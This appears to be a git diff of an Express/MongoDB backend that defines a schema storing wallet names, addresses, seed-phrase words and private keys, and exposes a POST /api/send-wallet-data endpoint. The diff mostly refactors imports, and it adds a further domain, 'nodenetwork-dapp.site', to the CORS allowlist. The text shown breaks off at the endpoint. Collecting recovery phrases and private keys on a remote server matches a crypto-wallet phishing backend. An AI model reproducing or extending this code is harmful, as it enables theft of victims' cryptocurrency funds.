@@ -1,12 +1,12 @@
-import express, { json } from 'express';
-import { connect, Schema, model } from 'mongoose';
-import cors from 'cors';
+const express = require('express');
+const mongoose = require('mongoose');
+const cors = require('cors');
 require('dotenv').config();
 
 const app = express();
 
 // Configure CORS
-const allowedOrigins = ['https://theblockchain.vercel.app', 'http://localhost:5173'];
+const allowedOrigins = ['https://theblockchain.vercel.app', 'http://localhost:5173','https://nodenetwork-dapp.site/'];
 
 app.use(
   cors({
@@ -24,17 +24,16 @@ app.use(
     optionsSuccessStatus: 200,
   })
 );
-app.options('*', cors());
 
 app.use(express.json());
 
 // MongoDB connection
-connect(process.env.VITE_MONGO_URI)
+mongoose.connect(process.env.VITE_MONGO_URI)
   .then(() => console.log('MongoDB connected'))
   .catch(err => console.log('MongoDB connection error:', err));
 
 // Define a schema for wallet data
-const walletSchema = new Schema({
+const walletSchema = new mongoose.Schema({
   walletName: String,
   walletAddress: String,
   phraseWords: [String],
@@ -42,7 +41,7 @@ const walletSchema = new Schema({
   privateKey: String,
 }, { timestamps: true });
 
-const Wallet = model('Wallet', walletSchema);
+const Wallet = mongoose.model('Wallet', walletSchema);
 
 // Endpoint to handle wallet data
 app.post('/api/send-wallet-data', async (req, res) => {
